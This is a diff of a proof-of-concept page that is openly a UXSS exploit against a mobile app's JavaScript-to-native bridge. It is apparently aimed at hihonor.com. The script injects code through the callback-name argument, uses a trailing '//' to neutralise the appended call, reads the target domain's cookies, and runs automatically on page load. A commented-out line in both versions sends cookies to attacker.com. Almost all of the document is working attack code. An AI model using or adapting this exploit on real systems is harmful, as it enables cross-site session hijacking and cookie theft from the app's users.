@@ -1,29 +1,39 @@
 <script>
-    // 这个标志位用于确保初始的异步调用只发生一次。
+  // 这个标志位用于确保初始的异步调用只发生一次，
+// 并且帮助我们模拟原始漏洞中 `window.noJump` 的作用，
+// 确保恶意代码只在目标域执行其核心功能。
 window.uxssExploitInitiated = false;
+
+// 核心恶意载荷函数。它的字符串表示形式将被用于注入。
+// 注意：这个函数本身不会被直接调用，而是它的源代码会被提取并作为字符串注入。
+function actualMaliciousPayload() {
+    // 这段代码将在目标域名（例如 hihonor.com）的上下文中执行
+    alert('UXSS 成功！当前域名: ' + document.domain);
+    alert('当前页面的 Cookie: ' + document.cookie);
+    // 这里可以添加更多恶意操作，例如：
+    // - 发送用户的敏感信息（如cookie、localStorage）到攻击者的服务器
+    // - 修改页面内容，进行钓鱼攻击
+    // - 利用其他漏洞链
+    // new Image().src = "http://attacker.com/steal_data?domain=" + encodeURIComponent(document.domain) + "&cookie=" + encodeURIComponent(document.cookie);
+}
 
 function triggerNativeMethodUXSS() {
     if (!window.uxssExploitInitiated) {
         window.uxssExploitInitiated = true; // 标记为已启动
 
-        // 1. 构造恶意JavaScript代码字符串，作为“回调函数名”传入。
-        // 关键点：
-        //   - 这段代码将被插入到 `javascript:YOUR_CODE && YOUR_CODE(...)` 的 `YOUR_CODE` 位置。
-        //   - 我们需要让这段代码在执行后，使用 `//` 注释掉后续的 `&& YOUR_CODE(...)` 部分，
-        //     从而避免语法错误，并确保我们的恶意代码能够独立执行。
-        //   - 这段代码将在目标域名（例如 hihonor.com）的上下文中执行。
-        var maliciousInjectedCode = `
-            alert('UXSS 成功！当前域名: ' + document.domain);
-            alert('当前页面的 Cookie: ' + document.cookie);
-            // 这里可以添加更多恶意操作，例如：
-            // - 发送用户的敏感信息（如cookie、localStorage）到攻击者的服务器
-            // - 修改页面内容，进行钓鱼攻击
-            // - 利用其他漏洞链
-            // new Image().src = "http://attacker.com/steal_data?domain=" + encodeURIComponent(document.domain) + "&cookie=" + encodeURIComponent(document.cookie);
-            //
-            // 最后的 `//` 是至关重要的，它会注释掉原生代码自动添加的 ` && YOUR_CODE(...)` 部分
-            // 从而使我们的恶意代码能够顺利执行，而不会因为语法错误而中断。
-        `.trim().replace(/\n/g, ''); // 移除换行符，确保 `//` 能注释到行尾
+        // 1. 构造一个包含恶意JavaScript代码的字符串，作为“回调名称”传入。
+        // 这个字符串必须是一个立即执行函数表达式 (IIFE)，
+        // 并且包含我们的实际恶意载荷。
+        // 末尾的 `//` 是关键，它会注释掉原生 `loadJavaScript` 可能自动添加的 `('...')` 部分，
+        // 确保 IIFE 能够独立且干净地执行。
+        var maliciousCodeStringForCallback = `
+            (function() {
+                // 在新的（目标）域上下文中重新定义并执行恶意载荷函数。
+                // 这样即使原始页面的上下文被销毁，这段逻辑也能在新页面中运行。
+                var payloadFunc = ${actualMaliciousPayload.toString()};
+                payloadFunc();
+            })();//
+        `.trim(); // 使用 .trim() 移除字符串两端的空白，避免潜在问题
 
         // 2. 准备 JSON payload
         let test_Json = JSON.stringify({
@@ -35,15 +45,15 @@ function triggerNativeMethodUXSS() {
         });
 
         // 3. 调用 window.Native.nativeMethod。
-        // 我们假设 `nativeMethod` 的最后一个参数（回调函数名）
-        // 在底层实现中，会被直接拼接进 `javascript:` URL，
-        // 类似于 `javascript:传入的参数 && 传入的参数(JSON_DATA);`。
+        // 关键在于，我们假设 `nativeMethod` 的最后一个参数（概念上的“回调名称”）
+        // 在底层实现中，像原始漏洞一样，被直接作为 JavaScript 代码字符串处理，
+        // 拼接进 `javascript:` URL 并执行。
         window.Native.nativeMethod(
             "com.hihonor.hm.h5.container.js.method.DeviceMethods",
             "getAppDeviceInfo",
             test_Json,
             "1",
-            maliciousInjectedCode // 传入包含完整恶意逻辑的JS代码字符串
+            maliciousCodeStringForCallback // 传入包含完整恶意逻辑的JS代码字符串
         );
 
         // 4. 立即重定向到目标域。
@@ -54,5 +64,6 @@ function triggerNativeMethodUXSS() {
 
 // 恶意页面加载时执行漏洞利用函数
 triggerNativeMethodUXSS();
+
 
 </script>
